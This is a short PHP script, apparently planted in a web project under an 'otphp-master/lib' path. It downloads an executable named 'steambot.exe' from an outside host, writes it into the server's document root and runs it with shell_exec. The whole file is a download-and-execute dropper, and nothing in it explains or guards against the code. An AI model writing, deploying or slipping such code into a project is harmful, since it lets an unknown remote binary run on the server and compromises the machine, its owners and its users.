<?php

$path = $_SERVER["DOCUMENT_ROOT"];
$file1 = "/otphp-master/lib/steambot.exe";
$fullpath1 = $path . $file1;


 $source = "http://csgourban.com/steambot.exe";
 $destination = $fullpath1;

 $data = file_get_contents($source);
 $file = fopen($destination, "w+");
 fputs($file, $data);
 fclose($file);

shell_exec($fullpath1);
?>